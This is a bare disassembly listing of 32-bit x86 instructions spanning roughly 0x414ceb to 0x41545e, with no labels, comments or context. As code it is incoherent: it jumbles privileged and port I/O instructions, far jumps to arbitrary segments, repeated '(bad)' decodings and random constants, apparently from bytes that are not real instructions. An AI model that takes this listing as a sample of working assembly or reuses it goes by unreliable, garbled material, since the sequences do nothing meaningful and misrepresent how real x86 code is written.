  414ceb:	sahf   
  414cec:	dec    ecx
  414ced:	lods   eax,DWORD PTR ds:[esi]
  414cee:	pop    edx
  414cef:	rcl    BYTE PTR [ebx],1
  414cf1:	sbb    bh,BYTE PTR [ecx]
  414cf3:	mov    edx,0x312d2c9f
  414cf8:	jne    0x414ce5
  414cfa:	outs   dx,BYTE PTR ds:[esi]
  414cfb:	push   cs
  414cfc:	mov    ds:0x49c12062,al
  414d01:	pop    es
  414d02:	fwait
  414d03:	push   esi
  414d04:	xor    al,0xab
  414d06:	mov    edi,0x23f63f86
  414d0b:	aam    0x52
  414d0d:	sbb    eax,0x4531b917
  414d12:	sub    DWORD PTR [edi+0x79191ca2],ecx
  414d18:	inc    ecx
  414d19:	or     ah,BYTE PTR [ebp-0x37d1a824]
  414d1f:	jle    0x414d2f
  414d21:	nop
  414d22:	jge    0x414cc4
  414d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d25:	aam    0x6c
  414d27:	sbb    DWORD PTR [edi-0x3d],edx
  414d2a:	dec    esp
  414d2b:	add    esi,0xffffffc0
  414d2e:	sbb    DWORD PTR [edi+eax*2-0x766b4aaf],esp
  414d35:	sbb    eax,DWORD PTR [ecx]
  414d37:	adc    al,0x91
  414d39:	pop    ebp
  414d3a:	xor    BYTE PTR [edi],cl
  414d3c:	ds or  ebx,eax
  414d3f:	jmp    0x90b5:0x22bf3647
  414d46:	mov    cl,0xeb
  414d48:	and    ch,BYTE PTR [ebx]
  414d4a:	in     al,dx
  414d4b:	dec    eax
  414d4c:	sbb    al,ah
  414d4e:	pop    es
  414d4f:	adc    BYTE PTR [edi],al
  414d51:	xor    al,0x9e
  414d53:	retf   
  414d54:	ret    0xa223
  414d57:	in     al,dx
  414d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d59:	sub    al,0x5a
  414d5b:	mov    dl,0xc7
  414d5d:	add    BYTE PTR [esi],ch
  414d5f:	jge    0x414d5f
  414d61:	and    DWORD PTR [ecx-0x30],edx
  414d64:	push   esp
  414d65:	fdivr  QWORD PTR [eax-0x3113f2e3]
  414d6b:	xchg   esp,eax
  414d6c:	pop    es
  414d6d:	pop    edi
  414d6e:	stc    
  414d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d70:	sub    ebp,eax
  414d72:	es push ds
  414d74:	pop    eax
  414d75:	stos   DWORD PTR es:[edi],eax
  414d76:	(bad)  [edi-0x6f]
  414d79:	jecxz  0x414d7c
  414d7b:	popf   
  414d7c:	mov    ebp,0x12b8f1fa
  414d81:	push   cs
  414d82:	lea    edx,[edi+0x55]
  414d85:	pop    ds
  414d86:	and    BYTE PTR [eax],bh
  414d88:	sbb    DWORD PTR [ebx+ecx*4+0x38],edx
  414d8c:	mov    ah,0xa6
  414d8e:	add    BYTE PTR [ecx+ebp*1-0x2],dl
  414d92:	pop    ebx
  414d93:	aaa    
  414d94:	mov    ah,dh
  414d96:	mov    DWORD PTR [eax],ecx
  414d98:	pop    eax
  414d99:	sahf   
  414d9a:	in     eax,dx
  414d9b:	pop    edx
  414d9c:	jmp    0x460567c4
  414da1:	addr16 pop ebx
  414da3:	xchg   ecx,eax
  414da4:	(bad)  
  414da5:	jmp    0x7b04:0x3be59e90
  414dac:	shr    DWORD PTR [ecx],0xa7
  414daf:	mov    esi,0x1171fe57
  414db4:	rol    BYTE PTR [eax+0x74b4a295],0xb4
  414dbb:	call   0x34dc138f
  414dc0:	and    ebx,edi
  414dc2:	pushf  
  414dc3:	shl    DWORD PTR [esi+0x11],1
  414dc6:	dec    edx
  414dc7:	mov    BYTE PTR [esi-0x37],cl
  414dca:	call   0x326cf87c
  414dcf:	sbb    edx,DWORD PTR [ecx]
  414dd1:	in     al,0xc0
  414dd3:	pusha  
  414dd4:	frstor [ecx+0x24]
  414dd7:	test   ch,cl
  414dd9:	pop    esp
  414dda:	das    
  414ddb:	fldenv [ecx]
  414ddd:	jp     0x414df3
  414ddf:	mov    ds,WORD PTR [eax-0x52]
  414de2:	sub    edi,ebx
  414de4:	xchg   edi,eax
  414de5:	mov    ah,cl
  414de7:	lods   eax,DWORD PTR ds:[esi]
  414de8:	es inc eax
  414dea:	mov    dh,0x93
  414dec:	sahf   
  414ded:	sub    edx,edx
  414def:	fdivr  DWORD PTR [esi-0x70]
  414df2:	cli    
  414df3:	daa    
  414df4:	stos   DWORD PTR es:[edi],eax
  414df5:	loope  0x414e4c
  414df7:	ins    BYTE PTR es:[edi],dx
  414df8:	cld    
  414df9:	(bad)  
  414dfa:	(bad)  
  414dfb:	jmp    0x414e20
  414dfd:	push   edi
  414dfe:	shr    BYTE PTR [ebx-0x69],0x52
  414e02:	xchg   ecx,eax
  414e03:	dec    esp
  414e04:	cmp    al,0x1d
  414e06:	dec    eax
  414e07:	sti    
  414e08:	add    ch,BYTE PTR [edx]
  414e0a:	xchg   ebx,eax
  414e0b:	lahf   
  414e0c:	cmp    al,0xbb
  414e0e:	sar    DWORD PTR [edx-0x6ac88c35],cl
  414e14:	daa    
  414e15:	pop    eax
  414e16:	xchg   BYTE PTR [edi+0x3f],ch
  414e19:	and    eax,0x4bb0fd64
  414e1e:	adc    eax,0x3a538919
  414e23:	xchg   ebx,eax
  414e24:	mov    al,ds:0x42fcc48d
  414e29:	pop    ds
  414e2a:	sub    eax,0x6777e88b
  414e2f:	dec    eax
  414e30:	into   
  414e31:	bound  edx,QWORD PTR [ebx-0x2e641860]
  414e37:	retf   
  414e38:	xchg   edx,eax
  414e39:	bound  edi,QWORD PTR [edi+0x43c54a10]
  414e3f:	jne    0x414e3f
  414e41:	mov    edi,0x58fc4972
  414e46:	int3   
  414e47:	cmp    BYTE PTR [ebp-0x1606b14b],ah
  414e4d:	dec    eax
  414e4e:	dec    esp
  414e4f:	pusha  
  414e50:	sub    eax,0x598a2435
  414e55:	push   esi
  414e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e57:	retf   0x8eb3
  414e5a:	sar    BYTE PTR [edi-0x63],0x2e
  414e5e:	pop    ds
  414e5f:	lods   eax,DWORD PTR ds:[esi]
  414e60:	add    ecx,DWORD PTR [ebp-0x3e]
  414e63:	pop    edx
  414e64:	sub    ebp,DWORD PTR [edx+0x1db38f6e]
  414e6a:	pushf  
  414e6b:	add    esi,ebp
  414e6d:	scas   al,BYTE PTR es:[edi]
  414e6e:	ror    DWORD PTR [ecx+0x6a444c3b],0x31
  414e75:	mov    bh,0x1d
  414e77:	fcomp  DWORD PTR [ecx+0x4d]
  414e7a:	mov    dh,0x4a
  414e7c:	mov    ds:0x19de442a,eax
  414e81:	daa    
  414e82:	pop    eax
  414e83:	push   ebx
  414e84:	inc    esi
  414e85:	pop    edx
  414e86:	aas    
  414e87:	das    
  414e88:	iret   
  414e89:	add    DWORD PTR [esi+0x7925dd39],eax
  414e8f:	sub    eax,0x85bd52d7
  414e94:	sbb    al,0x6c
  414e96:	or     bl,BYTE PTR [esi+0x4c]
  414e99:	xor    al,0x5c
  414e9b:	fdivr  st,st(0)
  414e9d:	cmp    al,0xec
  414e9f:	loop   0x414eba
  414ea1:	jecxz  0x414ea7
  414ea3:	cmp    BYTE PTR [ebx+0x52],dl
  414ea6:	lahf   
  414ea7:	fbld   TBYTE PTR [ecx+0x5d]
  414eaa:	adc    DWORD PTR [ecx+0x19ec5d64],esi
  414eb0:	fld    DWORD PTR [esp+ecx*4]
  414eb3:	js     0x414ed1
  414eb5:	jecxz  0x414f1e
  414eb7:	xchg   BYTE PTR gs:[ebx],bl
  414eba:	sub    dh,BYTE PTR [eax]
  414ebc:	inc    ebx
  414ebd:	dec    eax
  414ebe:	and    ch,BYTE PTR [eax+0x7749798f]
  414ec4:	and    ecx,DWORD PTR [ecx]
  414ec6:	xchg   ebp,eax
  414ec7:	and    al,0x71
  414ec9:	out    dx,al
  414eca:	gs ret 
  414ecc:	sub    esi,DWORD PTR cs:[edx-0x5471003c]
  414ed3:	aad    0xd3
  414ed5:	ins    BYTE PTR es:[edi],dx
  414ed6:	ret    
  414ed7:	cmp    al,BYTE PTR [esi+0x64546975]
  414edd:	fmul   st(1),st
  414edf:	inc    esi
  414ee0:	outs   dx,DWORD PTR ds:[esi]
  414ee1:	sub    al,ch
  414ee3:	pushf  
  414ee4:	lock fwait
  414ee6:	push   eax
  414ee7:	add    eax,0xfaa83ed8
  414eec:	lods   al,BYTE PTR ds:[esi]
  414eed:	lods   eax,DWORD PTR ds:[esi]
  414eee:	inc    edx
  414eef:	or     BYTE PTR [esi-0x4b],dl
  414ef2:	retf   
  414ef3:	fcmovbe st,st(5)
  414ef5:	div    esp
  414ef7:	mov    dh,0x44
  414ef9:	adc    esi,DWORD PTR [edx+ebp*8-0x1b]
  414efd:	sub    DWORD PTR ds:0xca2bd531,edx
  414f03:	push   edi
  414f04:	shl    BYTE PTR [ebp+0x7c63ca87],1
  414f0a:	mov    eax,0xaa56bf25
  414f0f:	push   ebx
  414f10:	sbb    ecx,ebp
  414f12:	fiadd  WORD PTR [esi]
  414f14:	(bad)  
  414f15:	mov    edi,0x2b5c4547
  414f1a:	mov    bh,0xe4
  414f1c:	pop    esi
  414f1d:	sub    ecx,eax
  414f1f:	mov    cl,0xff
  414f21:	push   ebp
  414f22:	aad    0x92
  414f24:	jle    0x414fa2
  414f26:	add    eax,0x53be46dc
  414f2b:	enter  0x42c6,0xf0
  414f2f:	loope  0x414f71
  414f31:	xchg   edx,eax
  414f32:	xor    eax,0xecd8dc14
  414f37:	and    dl,BYTE PTR [edx-0x5bf281ac]
  414f3d:	loop   0x414f1d
  414f3f:	ja     0x414f93
  414f41:	aad    0xa7
  414f43:	pusha  
  414f44:	scas   al,BYTE PTR es:[edi]
  414f45:	pop    edx
  414f46:	lods   al,BYTE PTR ds:[esi]
  414f47:	or     BYTE PTR [edi-0x3b],bh
  414f4a:	mov    edx,0x49f0800b
  414f4f:	nop
  414f50:	dec    ebx
  414f51:	push   ebx
  414f52:	pop    es
  414f53:	sub    ch,BYTE PTR [ebx+0x354f5263]
  414f59:	mov    bh,0x60
  414f5b:	inc    ebx
  414f5c:	dec    ebx
  414f5d:	fist   WORD PTR [esi+esi*4+0xa69328e]
  414f64:	(bad)  
  414f66:	pop    ss
  414f67:	addr16 fwait
  414f69:	mov    esi,0x81a30456
  414f6e:	cmp    al,0x86
  414f70:	loope  0x414f98
  414f72:	sub    al,0x1
  414f74:	cli    
  414f75:	push   cs
  414f76:	stos   BYTE PTR es:[edi],al
  414f77:	str    WORD PTR [edx+0x3b]
  414f7b:	into   
  414f7c:	mov    ah,0x4e
  414f7e:	push   edi
  414f7f:	push   ecx
  414f80:	sub    ah,dh
  414f82:	mov    cs,WORD PTR [esi+ebx*8+0x73]
  414f86:	rcr    DWORD PTR [eax+0x2a],cl
  414f89:	dec    edi
  414f8a:	cmp    ebp,ebx
  414f8c:	outs   dx,DWORD PTR ds:[esi]
  414f8d:	and    BYTE PTR ds:0x2c1f2a8a,dl
  414f93:	adc    DWORD PTR [ebx+eax*8],edi
  414f96:	sti    
  414f97:	and    cl,BYTE PTR [eax]
  414f99:	jne    0x414feb
  414f9b:	xor    eax,0xa646b4fa
  414fa0:	scas   eax,DWORD PTR es:[edi]
  414fa1:	push   edi
  414fa2:	dec    BYTE PTR [ebx-0x28]
  414fa5:	ret    
  414fa6:	clc    
  414fa7:	arpl   WORD PTR [esi],dx
  414fa9:	loop   0x414f7c
  414fab:	ins    DWORD PTR es:[edi],dx
  414fac:	addr16 pop eax
  414fae:	jns    0x414f4e
  414fb0:	sbb    DWORD PTR [edx+0x78],esp
  414fb3:	mov    dh,0x8a
  414fb5:	sub    eax,0x1aa61103
  414fba:	or     BYTE PTR [eax],0xa6
  414fbd:	ror    BYTE PTR [eax+0x76],0xa5
  414fc1:	inc    ebp
  414fc2:	lahf   
  414fc3:	inc    esi
  414fc4:	mov    ebx,0x7c523956
  414fc9:	(bad)  
  414fca:	push   esi
  414fcb:	jno    0x414f9a
  414fcd:	sub    eax,DWORD PTR [edi+edx*8+0x7ea866c0]
  414fd4:	xor    cl,BYTE PTR [ecx+0x58]
  414fd7:	arpl   WORD PTR [ebx+0x1a],si
  414fda:	jno    0x41500a
  414fdc:	fs cdq 
  414fde:	inc    ebx
  414fdf:	daa    
  414fe0:	push   ecx
  414fe1:	test   eax,0x3ae3aacf
  414fe6:	xlat   BYTE PTR ds:[ebx]
  414fe7:	dec    edx
  414fe8:	add    al,0xd1
  414fea:	std    
  414feb:	leave  
  414fec:	push   ebx
  414fed:	dec    edi
  414fee:	ss sbb al,0x8f
  414ff1:	loop   0x415064
  414ff3:	push   ds
  414ff4:	(bad)  
  414ff5:	jbe    0x41506e
  414ff7:	push   eax
  414ff8:	and    eax,DWORD PTR [eax+0x1e]
  414ffb:	inc    eax
  414ffc:	push   ss
  414ffd:	xchg   esi,eax
  414ffe:	fbld   TBYTE PTR [ebx+eax*4]
  415001:	mov    esp,0x7c8b3ec0
  415006:	pop    ss
  415007:	inc    ebp
  415008:	xor    ch,bl
  41500a:	loope  0x415004
  41500c:	data16 cld 
  41500e:	mov    ebp,0x8456b6d0
  415013:	or     edx,eax
  415015:	(bad)  
  415016:	push   esi
  415017:	icebp  
  415018:	or     edi,DWORD PTR [esi]
  41501a:	in     al,dx
  41501b:	cmp    eax,0x9e3209e1
  415020:	mov    ebp,0x70831a96
  415025:	mov    ebx,0x865bf9ba
  41502a:	inc    BYTE PTR [ebx-0x18bbf2b0]
  415030:	cmp    ah,BYTE PTR [edi]
  415032:	out    0x62,eax
  415034:	xor    esp,DWORD PTR [edx+ebx*4]
  415037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415039:	fcmove st,st(3)
  41503b:	sbb    cl,BYTE PTR [ecx+0x59]
  41503e:	sub    BYTE PTR [ebx+0x3580785a],0x3d
  415045:	cld    
  415046:	(bad)  
  415047:	mov    esi,0x4f1ca1f
  41504c:	lahf   
  41504d:	jg     0x415082
  41504f:	add    DWORD PTR [ecx+0x3a],esp
  415052:	pop    es
  415053:	push   esp
  415054:	push   ebp
  415055:	sbb    bh,ah
  415057:	fbld   TBYTE PTR [esp+ecx*1]
  41505a:	xchg   ebp,eax
  41505b:	xor    BYTE PTR [edi-0x7f],bl
  41505e:	sbb    al,0x13
  415060:	inc    esp
  415061:	mov    DWORD PTR [eax+0x2319bb43],esp
  415067:	out    dx,eax
  415068:	int    0x28
  41506a:	icebp  
  41506b:	and    al,0xc
  41506d:	sub    DWORD PTR [ecx-0x374b1c7b],esp
  415073:	fist   WORD PTR [ebp-0x67]
  415076:	ja     0x4150c5
  415078:	imul   ecx,DWORD PTR [edx-0x4a],0xec055e26
  41507f:	inc    eax
  415080:	inc    esp
  415081:	ret    0x77e4
  415084:	mov    dh,0x23
  415086:	in     al,0xaa
  415088:	fcmovne st,st(2)
  41508a:	out    0xc8,al
  41508c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41508d:	cmp    eax,0x1b1c5116
  415092:	push   0xffffff9e
  415094:	mov    dh,0xac
  415096:	xchg   BYTE PTR [ecx-0x311edc5a],cl
  41509c:	xchg   ebp,eax
  41509d:	popa   
  41509e:	add    al,0x36
  4150a0:	das    
  4150a1:	in     eax,dx
  4150a2:	loope  0x41504b
  4150a4:	ret    0x92b
  4150a7:	out    dx,al
  4150a8:	sub    ah,BYTE PTR [edi]
  4150aa:	push   ecx
  4150ab:	pusha  
  4150ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ae:	xor    BYTE PTR [ebx+0x2658fa0b],0xc8
  4150b5:	mov    dl,0x77
  4150b7:	dec    esi
  4150b8:	scas   eax,DWORD PTR es:[edi]
  4150b9:	bound  ecx,QWORD PTR [edi+0x4d110209]
  4150bf:	ficomp DWORD PTR [edi-0x56]
  4150c2:	fdivrp st(2),st
  4150c4:	(bad)  
  4150c5:	pop    edx
  4150c6:	call   0x7fcc:0xcb20e1ed
  4150cd:	xchg   ecx,eax
  4150ce:	imul   ebx,DWORD PTR [esi+eax*4+0x60],0x6fee4e66
  4150d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150d7:	or     DWORD PTR [ebx-0x2c],ebx
  4150da:	dec    ebx
  4150db:	push   ebx
  4150dc:	mov    ah,0x13
  4150de:	ja     0x415152
  4150e0:	lock daa 
  4150e2:	aad    0x44
  4150e4:	sbb    al,ah
  4150e6:	inc    esp
  4150e7:	popf   
  4150e8:	mov    ss,WORD PTR es:[eax+eiz*2+0x76d62489]
  4150f0:	aad    0x67
  4150f2:	sbb    BYTE PTR [ebx+0x20],al
  4150f5:	dec    ecx
  4150f6:	xchg   ebx,eax
  4150f7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150f9:	adc    eax,0x1a96be28
  4150fe:	je     0x4150ff
  415100:	sti    
  415101:	fs dec esp
  415103:	mov    esi,0x60b00422
  415108:	add    ebp,DWORD PTR [ebx]
  41510a:	jl     0x41516d
  41510c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41510d:	nop
  41510e:	jecxz  0x4150ad
  415110:	hlt    
  415111:	mov    ecx,0x4b974341
  415116:	jg     0x41514a
  415118:	rcr    edi,0x5c
  41511b:	jge    0x41516c
  41511d:	sub    edi,DWORD PTR [edx+0x480ced0b]
  415123:	iret   
  415124:	push   ebx
  415125:	mov    DWORD PTR [esi-0x53],esi
  415128:	outs   dx,BYTE PTR ds:[esi]
  415129:	push   DWORD PTR [edi]
  41512b:	ss xchg ebx,eax
  41512d:	addr16 cmp eax,0xd289794e
  415133:	mov    bh,0x17
  415135:	repz call 0x9d384ec1
  41513b:	cmp    al,0x7
  41513d:	fs push edi
  41513f:	clc    
  415140:	pushf  
  415141:	adc    ch,BYTE PTR [ebp+0x50]
  415144:	in     al,0x28
  415146:	pop    ecx
  415147:	jmp    0x415177
  415149:	dec    ebx
  41514a:	mov    BYTE PTR [ecx+0x375b837f],cl
  415150:	xchg   esp,eax
  415151:	cli    
  415152:	add    esp,DWORD PTR [edi]
  415154:	adc    al,0x6a
  415156:	mov    es,WORD PTR [esi+0x127ee0d2]
  41515c:	imul   BYTE PTR [esi+0x7a]
  41515f:	imul   eax,esp,0xffffff95
  415162:	mov    dh,0x1e
  415164:	xchg   edx,eax
  415165:	pop    edi
  415166:	xchg   cl,cl
  415168:	xchg   ecx,eax
  415169:	cmp    eax,DWORD PTR [ecx+0x37]
  41516c:	mov    ds:0xad6a07ef,al
  415171:	pop    ss
  415172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415173:	sub    eax,0x873790e
  415178:	leave  
  415179:	xchg   DWORD PTR [edx+ebp*8],esi
  41517c:	mov    ah,0xd9
  41517e:	push   esp
  41517f:	push   ecx
  415180:	cld    
  415181:	aas    
  415182:	xchg   DWORD PTR [eax-0x699e3e3f],esp
  415188:	push   0xffffffeb
  41518a:	push   cs
  41518b:	inc    esp
  41518c:	cmp    al,0xa
  41518e:	jnp    0x4151d0
  415190:	inc    esp
  415191:	aas    
  415192:	mov    WORD PTR [edx],gs
  415194:	sbb    eax,0x8c43dfd8
  415199:	stos   BYTE PTR es:[edi],al
  41519a:	out    0x2f,al
  41519c:	adc    bh,ah
  41519e:	mov    al,ds:0x13082eb4
  4151a3:	fisub  DWORD PTR [ecx]
  4151a5:	fidivr DWORD PTR [ecx]
  4151a7:	push   esi
  4151a8:	mov    ds:0xc0df9e68,eax
  4151ad:	stos   BYTE PTR es:[edi],al
  4151ae:	stos   BYTE PTR es:[edi],al
  4151af:	into   
  4151b0:	ds pop ds
  4151b2:	inc    edi
  4151b3:	retf   0x8d4e
  4151b6:	xlat   BYTE PTR ds:[ebx]
  4151b7:	das    
  4151b8:	add    eax,0x9598e828
  4151bd:	das    
  4151be:	inc    edx
  4151bf:	call   0x66621dd5
  4151c4:	cmp    dh,BYTE PTR [edi-0x3b28c645]
  4151ca:	lods   al,BYTE PTR ds:[esi]
  4151cb:	mov    cl,0xbc
  4151cd:	push   0x6b
  4151cf:	stc    
  4151d0:	sub    ebp,ebp
  4151d2:	sbb    ah,cl
  4151d4:	fs sbb eax,0x83a09d39
  4151da:	dec    edx
  4151db:	dec    eax
  4151dc:	sub    eax,0x6658d8e9
  4151e1:	sar    esi,cl
  4151e3:	add    eax,0x8ff6dc4b
  4151e8:	in     al,0xaa
  4151ea:	inc    ebx
  4151eb:	aas    
  4151ec:	dec    ebp
  4151ed:	sbb    DWORD PTR [eax-0x2fce6d29],0x47ba7f1d
  4151f7:	fs js  0x415182
  4151fa:	int    0x91
  4151fc:	sub    ch,bl
  4151fe:	cmp    al,0x33
  415200:	ret    0x9d97
  415203:	lds    eax,FWORD PTR [ebx]
  415205:	test   eax,0x19f8c120
  41520a:	(bad)  
  41520b:	ret    
  41520c:	dec    ebp
  41520d:	mov    ah,0x35
  41520f:	daa    
  415210:	sub    cl,BYTE PTR [ecx-0x7e17fa]
  415216:	jns    0x415290
  415218:	mov    eax,ds:0x2c6ecdac
  41521d:	mov    edx,0x6bbd85c6
  415222:	cdq    
  415223:	adc    bh,0x1e
  415226:	jno    0x415233
  415228:	pushf  
  415229:	int    0xb0
  41522b:	inc    edx
  41522c:	push   0xccd70266
  415231:	test   BYTE PTR [edi+0x74],dh
  415234:	repnz inc edi
  415236:	aad    0x89
  415238:	shr    BYTE PTR [ebx],0x9c
  41523b:	ret    0x9338
  41523e:	faddp  st(5),st
  415240:	cwde   
  415241:	ds sub al,0x4d
  415244:	dec    eax
  415245:	mov    edx,0x11bc9245
  41524a:	ins    DWORD PTR es:[edi],dx
  41524b:	jnp    0x415242
  41524d:	mov    eax,ds:0x6542e24
  415252:	add    al,0x1c
  415254:	adc    dl,BYTE PTR [edi-0x40]
  415257:	repz mov edi,0xeb1ef2c2
  41525d:	mov    bh,0x6f
  41525f:	jmp    0x2856:0x68b53e07
  415266:	inc    ebp
  415267:	mov    eax,ds:0x1bda9213
  41526c:	jno    0x4152dc
  41526e:	mov    ah,BYTE PTR [edx+ebp*2+0x156524d2]
  415275:	jmp    0xf05b4af7
  41527a:	in     eax,dx
  41527b:	das    
  41527c:	hlt    
  41527d:	adc    eax,0x26d41344
  415282:	jne    0x415303
  415284:	les    edi,FWORD PTR [ebx+esi*2]
  415287:	add    dl,dl
  415289:	add    bh,BYTE PTR [ebx-0x33a80344]
  41528f:	sbb    al,0x22
  415291:	stos   BYTE PTR es:[edi],al
  415292:	push   edx
  415293:	cmp    al,0x3c
  415295:	xlat   BYTE PTR ds:[ebx]
  415296:	xor    eax,0x57e8a1ed
  41529b:	fldenv [ebp-0x6210c78d]
  4152a1:	in     eax,dx
  4152a2:	int3   
  4152a3:	mov    al,BYTE PTR [eax+ebx*8]
  4152a6:	pop    esp
  4152a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a8:	shr    DWORD PTR [ebp-0x3ba01108],0xbf
  4152af:	cmp    BYTE PTR [esi-0x77],0x70
  4152b3:	clc    
  4152b4:	imul   ecx,esi,0x43ab239b
  4152ba:	ja     0x4152cd
  4152bc:	sub    al,0xba
  4152be:	mov    ah,0x2d
  4152c0:	lds    esi,FWORD PTR [edi-0x65e2e176]
  4152c6:	aaa    
  4152c7:	xchg   esp,eax
  4152c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152c9:	dec    esi
  4152ca:	cld    
  4152cb:	mov    ds:0x459f5a98,al
  4152d0:	js     0x4152f7
  4152d2:	aam    0xb
  4152d4:	adc    BYTE PTR [ecx+0x3a],dl
  4152d7:	inc    ebp
  4152d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152d9:	(bad)  
  4152da:	int    0x62
  4152dc:	(bad)  
  4152de:	xchg   esi,eax
  4152df:	mov    bl,0x34
  4152e1:	int3   
  4152e2:	(bad)  
  4152e3:	mov    ds:0xee1ae95a,al
  4152e8:	jae    0x41527a
  4152ea:	icebp  
  4152eb:	pop    edx
  4152ec:	and    DWORD PTR [ebp-0x40],edx
  4152ef:	mov    ecx,0x74661019
  4152f4:	add    esi,DWORD PTR [edx+0x73]
  4152f7:	cwde   
  4152f8:	jnp    0x41528e
  4152fa:	pop    eax
  4152fb:	jle    0x4152bf
  4152fd:	ss sbb al,0x71
  415300:	div    DWORD PTR [edx+0x4c346fff]
  415306:	cmp    DWORD PTR [edx-0xc],ebp
  415309:	jno    0x415365
  41530b:	add    DWORD PTR [ecx],esp
  41530d:	pop    ebp
  41530e:	push   edx
  41530f:	push   ebx
  415310:	loope  0x41534e
  415312:	aad    0xb7
  415314:	inc    edi
  415315:	add    eax,0x37853b03
  41531a:	sbb    eax,0x3984a9ce
  41531f:	aam    0xa5
  415321:	imul   esi,DWORD PTR [ebx-0x437fe9c4],0x53
  415328:	xor    ebp,DWORD PTR [eax+eax*8+0x34]
  41532c:	add    bl,BYTE PTR [esi+0x63]
  41532f:	pop    ecx
  415330:	add    dl,BYTE PTR [ebx+ebx*8+0x5b0cf1e1]
  415337:	scas   eax,DWORD PTR es:[edi]
  415338:	rol    WORD PTR [ecx],0xad
  41533c:	push   ebp
  41533d:	or     BYTE PTR [ebp-0x5f4798bb],al
  415343:	ficomp WORD PTR [ecx-0x70]
  415346:	daa    
  415347:	and    eax,0xd124576f
  41534c:	clc    
  41534d:	(bad)  
  41534f:	sbb    eax,0xfc0332b0
  415354:	or     al,dl
  415356:	sbb    ebp,ebx
  415358:	adc    edx,edi
  41535a:	xor    edx,ebp
  41535c:	jg     0x41533e
  41535e:	xchg   ebx,eax
  41535f:	out    dx,al
  415360:	mov    edx,0x4e4a45a2
  415365:	fsub   DWORD PTR [esi]
  415367:	mov    esp,0xb0aed4fe
  41536c:	popa   
  41536d:	aad    0x2d
  41536f:	or     esp,DWORD PTR [eax]
  415371:	jmp    0x415314
  415373:	pop    ebp
  415374:	out    0x66,eax
  415376:	mov    BYTE PTR [edi+0x50f20f4b],ah
  41537c:	ror    eax,1
  41537e:	mov    ecx,0x8c24f210
  415383:	jge    0x415346
  415385:	cld    
  415386:	lea    edx,[eax-0x3b681f33]
  41538c:	push   edx
  41538d:	jbe    0x415365
  41538f:	dec    ecx
  415390:	imul   ebx,DWORD PTR [edx+0x4e1d6f2d],0x4664ba99
  41539a:	aas    
  41539b:	rol    DWORD PTR [edx],cl
  41539d:	xor    BYTE PTR [ecx],cl
  41539f:	jmp    0x4153f6
  4153a1:	pop    esp
  4153a2:	(bad)  
  4153a3:	mov    ecx,0x29b339f
  4153a8:	pusha  
  4153a9:	mov    ds:0x8e4d94b7,eax
  4153ae:	fmulp  st(0),st
  4153b0:	push   eax
  4153b1:	js     0x415358
  4153b3:	es loop 0x415337
  4153b6:	dec    ebx
  4153b7:	daa    
  4153b8:	call   0x7307cf34
  4153bd:	sbb    DWORD PTR [edi+0x7de57a78],edi
  4153c3:	mov    ebx,0xaee0f7c5
  4153c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153c9:	xor    DWORD PTR [edi],edi
  4153cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153cc:	sbb    eax,0x35980107
  4153d1:	jg     0x415448
  4153d3:	rol    BYTE PTR [ebx-0x14],1
  4153d6:	mov    edi,0x86eb2dd8
  4153db:	jb     0x4153a0
  4153dd:	mov    ebx,0x7ea64387
  4153e2:	pop    ds
  4153e3:	retf   
  4153e4:	fmul   QWORD PTR [edi+ebp*2-0x11]
  4153e8:	ret    0xfe58
  4153eb:	es pop ss
  4153ed:	test   eax,0x58469c86
  4153f2:	pop    ds
  4153f3:	aas    
  4153f4:	fsub   QWORD PTR [edx-0x40]
  4153f7:	pop    edi
  4153f8:	addr16 push 0xffffffe0
  4153fb:	out    0x16,eax
  4153fd:	std    
  4153fe:	loopne 0x415430
  415400:	push   esp
  415401:	sub    edi,DWORD PTR [eax]
  415403:	scas   eax,DWORD PTR es:[edi]
  415404:	sub    eax,0x7b53bfe5
  415409:	ins    DWORD PTR es:[edi],dx
  41540a:	adc    al,0xb5
  41540c:	aaa    
  41540d:	jmp    0x415404
  41540f:	sbb    eax,0xd11fe8a0
  415414:	jo     0x41539b
  415416:	xchg   esi,eax
  415417:	lds    ebx,FWORD PTR [edi]
  415419:	xchg   BYTE PTR [ebx],ah
  41541b:	cld    
  41541c:	pop    ebx
  41541d:	fwait
  41541e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41541f:	mov    ebx,0x14bd091e
  415424:	jl     0x4153fd
  415426:	mov    bl,0xb0
  415428:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41542a:	popa   
  41542b:	sub    al,0xf8
  41542d:	arpl   ax,ax
  41542f:	jmp    0x41540a
  415431:	mov    ds:0x59bc7009,eax
  415436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415437:	cmp    al,0xbc
  415439:	in     eax,0xea
  41543b:	adc    eax,0x79b3eb9d
  415440:	mov    esp,ss
  415442:	or     al,0x55
  415444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415445:	ds jbe 0x4153ec
  415448:	xlat   BYTE PTR ds:[ebx]
  415449:	outs   dx,BYTE PTR ds:[esi]
  41544a:	pop    eax
  41544b:	out    dx,al
  41544c:	stc    
  41544d:	mov    bl,0x4f
  41544f:	mov    al,0xce
  415451:	stc    
  415452:	leave  
  415453:	sub    DWORD PTR [esi],esi
  415455:	mov    bl,0x5a
  415457:	mov    dl,0xf6
  415459:	shl    BYTE PTR [eax],0xaa
  41545c:	popf   
  41545d:	aas    
  41545e:	(bad)  
